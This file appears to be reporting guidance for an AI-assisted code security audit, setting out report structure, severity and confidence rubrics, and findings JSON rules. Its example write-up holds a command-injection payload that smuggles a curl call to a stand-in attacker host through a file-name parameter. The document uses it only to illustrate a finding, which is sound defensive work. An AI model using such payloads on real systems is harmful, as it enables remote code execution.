# Reporting Guidance

Read this before Phase 6. Two deliverables, both derived from the SQLite state:
`security-report.md` (human review) and `findings.json` (machine consumption, schema-enforced).

## security-report.md — required structure

```markdown
# Security Report — <repo>
<audit id, date, scope, roles: which model did discovery, which did validation>

## Executive summary
<one-paragraph posture + counts table: severity × (confirmed/unverified/hypothesis/refuted)>

## Repository architecture overview
<components, data flows, stack, secret handling; link .security-audit/architecture.md>

## Threat model (summary)
<attacker profiles, selected classes and ranking; link .security-audit/threat-model.md>

## Confirmed vulnerabilities
<per finding: severity/confidence, attacker, trust boundary, location file:line,
 exploit path, impact, production reachability, reproduction steps, evidence refs,
 remediation proposal + regression test>

## Unverified findings
<per finding: same fields, PLUS why unverified + missing prerequisites + verification plan>

## Coverage limitations
<what was not audited and why; failed investigations; deployment assumptions used>
<state explicitly: mechanical checks verify structure/references, never exploitability>

## Remediation workflow
<patch status; note that nothing was merged/applied without human approval>
```

Do not bury refuted findings silently: list them in one line each under coverage/refuted with
the disproof reason — that is what makes the report auditable.

## Severity rubric

Severity = impact × reachability. Downgrade one step when the path requires assumptions not
evidenced in source (deployment config, specific proxy behavior).

| Impact | Public, unauthenticated | Authenticated low-priv | Internal-only |
|---|---|---|---|
| RCE / auth bypass / full data compromise | critical | critical | high |
| Cross-tenant data read/write | critical | high | medium |
| Single-tenant data read/write | high | high→medium | medium |
| Limited read (config, file existence) | medium→high | medium | low |
| DoS, spam, cosmetic | low→medium | low | info |

## Confidence rubric

- **high** — PoC reproduced on the original code AND adversarial validation failed to disprove it.
- **medium** — strong source evidence, PoC not executable here (missing prerequisites documented).
- **low** — plausible path, validator not yet run or key link unconfirmed. Never pair `low`
  confidence with `confirmed` status.

## production_reachable rules

- `true` only when repo evidence (route registration, build config, deploy manifests) shows the
  path ships. An assumption about deployment is not evidence — mark the finding `false` and
  record the assumption instead.
- Critical findings must assert this field (mechanically warned by `validate_findings.py`).

## findings.json field guidance

- `id` — computed by `audit_state.py`; never hand-edit (dedup depends on it).
- `description` — distinguish evidence from assumption in the text itself ("Source evidence: … /
  Assumption: …").
- `files[].evidence` — quote the original code verbatim; `verify_references.py` will confirm the
  file/line/symbol resolve.
- `reproduction` — exact commands or numbered steps; for `unverified` findings, start with the
  missing prerequisite ("NOT EXECUTED — missing prerequisite: …").
- `validation` — filled only by the independent validator; discovery contexts never touch it.
- `patch_ref` — set only in Phase 8, after human approval flow has produced the diff.
- Excluded from export by default: `status: refuted` findings (re-export with
  `--include-refuted` to archive them).

## Finding write-up example

```markdown
### SA-command-injection-dcbc2346 — Command injection in thumbnail generation

- **Severity / confidence:** critical / high · **Validation:** validated (independent model B)
- **Attacker:** anonymous-remote (no credentials)
- **Trust boundary:** network → application (HTTP input reaches OS shell)
- **Location:** src/upload.ts:10 in handleUpload — exec(`convert ${dest} …`)
- **Exploit path:** GET /upload?name=x;curl${IFS}attacker.example/p.sh
- **Impact:** unauthenticated RCE with application privileges. Production reachable: yes.
- **Repro:** 1. run fixture locally 2. curl … 3. observe id(1) output — poc.md has raw output.
- **Remediation:** execFile with argument vector + reject separators; regression test included.
```

One test the whole document must pass: a reviewer with repo access can reach every claim by
following the cited files, lines, and evidence paths — nothing depends on trusting the auditor.
